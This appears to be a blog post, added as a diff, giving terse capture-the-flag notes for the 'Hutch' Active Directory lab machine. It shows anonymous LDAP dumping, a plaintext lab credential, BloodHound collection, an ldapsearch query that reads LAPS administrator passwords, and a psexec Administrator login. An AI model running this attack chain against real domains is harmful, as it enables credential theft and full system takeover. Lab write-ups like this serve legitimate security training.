@@ -1,0 +1,18 @@
+---
+layout: post
+title:  "[PG][AD] hutch"
+date:   2026-11-08 12:01:00 +09:00
+categories: PG AD
+---## Hutch
+```
+ldapsearch -H ldap://$IP -x -s base namingcontexts
+ldapsearch -H ldap://$IP -x -b"DC=hutch,DC=offsec" > ldap_dump.txt
+{fmcsorley:CrabSharkJellyfish192 발견}
+
+bloodhound-python --dns-tcp -ns $IP -d hutch.offsec -u 'fmcsorley' -p 'CrabSharkJellyfish192' -c all
+{ReadLAPSPassword}
+
+ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://$IP "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+
+/opt/impacket/build/scripts-3.9/psexec.py "HUTCH/Administrator@$IP"
+```
